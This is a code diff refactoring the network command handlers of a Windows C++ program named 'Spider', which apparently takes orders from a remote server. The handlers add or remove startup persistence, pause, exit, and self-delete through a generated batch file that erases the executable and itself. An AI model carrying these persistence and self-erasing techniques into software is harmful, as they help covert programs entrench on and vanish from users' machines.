@@ -35,6 +35,8 @@ Network::Network(const std::string& port, const std::string& ip, Packager* packa
 
 
 Network::~Network() {
+	if (_engine)
+		delete _engine;
 }
 
 void Network::initNetwork() {
@@ -134,52 +136,52 @@ void Network::readLoop(boost::asio::yield_context yield)
 
 void Network::spider_switchStartup(Network &net, boost::asio::yield_context yield)
 {
-	PaquetCommandClient *paquet = new PaquetCommandClient();
+	PaquetCommandClient paquet;
 
-	paquet->setOk(1);
+	paquet.setOk(1);
 	if (_startup.isStartup()) {
 		_startup.delStartup();
 		if (_startup.isStartup()) {
-			paquet->setOk(0);
+			paquet.setOk(0);
 		}
 	}
 	else {
 		_startup.addStartup(_ip, _port);
 		if (!_startup.isStartup()) {
-			paquet->setOk(0);
+			paquet.setOk(0);
 		}
 	}
 
-	paquet->createPaquet();
-	net.getEngine().writePaquet(*paquet, yield);
+	paquet.createPaquet();
+	net.getEngine().writePaquet(paquet, yield);
 }
 
 void Network::spider_exit(Network& net, boost::asio::yield_context yield) {
-	PaquetCommandClient *paquet = new PaquetCommandClient();
+	PaquetCommandClient paquet;
 
-	paquet->setOk(1);
+	paquet.setOk(1);
 	std::cout << "Exiting Spider..." << std::endl;
-	paquet->createPaquet();
-	net.getEngine().writePaquet(*paquet, yield);
+	paquet.createPaquet();
+	net.getEngine().writePaquet(paquet, yield);
 	exit(EXIT_SUCCESS);
 }
 
 void Network::spider_remove(Network& net, boost::asio::yield_context yield) {
-	PaquetCommandClient *paquet = new PaquetCommandClient();
+	PaquetCommandClient paquet;
 	HMODULE	hModule = GetModuleHandle(NULL);
 
 	if (hModule)
 	{
 		WCHAR	path[MAX_PATH];
 
-		paquet->setOk(1);
+		paquet.setOk(1);
 		GetModuleFileName(hModule, path, MAX_PATH);
 		std::wstring wpath = path;
 		std::string str(wpath.begin(), wpath.end());
 		std::cout << "Remove: " << str << std::endl;
 		std::ofstream f("rmv.bat");
 		if (!f.is_open()) {
-			paquet->setOk(0);
+			paquet.setOk(0);
 		}
 		else {
 			f << "@ECHO off" << std::endl
@@ -189,26 +191,26 @@ void Network::spider_remove(Network& net, boost::asio::yield_context yield) {
 				<< "del Spider.exe >nul" << std::endl
 				<< "ping 127.0.0.1 -n 2 > nul" << std::endl
 				<< "(goto) 2>nul & del \"%~f0\" >nul" << std::endl;
-			paquet->createPaquet();
-			net.getEngine().writePaquet(*paquet, yield);
+			paquet.createPaquet();
+			net.getEngine().writePaquet(paquet, yield);
 			system("rmv.bat");
 			exit(EXIT_SUCCESS);
 		}
 	}
 	else
-		paquet->setOk(0);
-	paquet->createPaquet();
-	net.getEngine().writePaquet(*paquet, yield);
+		paquet.setOk(0);
+	paquet.createPaquet();
+	net.getEngine().writePaquet(paquet, yield);
 }
 
 void Network::spider_pause(Network& net, boost::asio::yield_context yield) {
-	PaquetCommandClient *paquet = new PaquetCommandClient();
+	PaquetCommandClient paquet;
 
-	paquet->setOk(1);
+	paquet.setOk(1);
 	if (net.getPause() == 0)
 		net.setPause(1);
 	else
 		net.setPause(0);
-	paquet->createPaquet();
-	net.getEngine().writePaquet(*paquet, yield);
+	paquet.createPaquet();
+	net.getEngine().writePaquet(paquet, yield);
 }
